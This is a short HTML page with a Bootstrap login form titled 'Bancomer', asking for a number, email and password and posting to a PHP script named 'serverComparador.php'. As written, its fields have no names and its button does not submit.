<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/bootstrap.min.js"/></script>
    <title>Bancomer</title>
</head>
<body>
    <div class="container">
        <form action="serverComparador.php" method="post">
            <div class="form-group">
                <label for="numero">Número: </label>
                <input type="text" name="" id="numero" class="form-control">
            </div>
            <div class="form-group">
                <label for="email">Correo: </label>
                <input type="email" name="" id="email" class="form-control">
            </div>
            <div class="form-group">
                <label for="pass">Contraseña: </label>
                <input type="password" name="" id="pass" class="form-control">
            </div>
            <div class="form-group">
                <input type="button" value="Enviar" class="form-control btn btn-primary">
            </div>
        </form>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/popper.min.js"></script>
</body>
</html>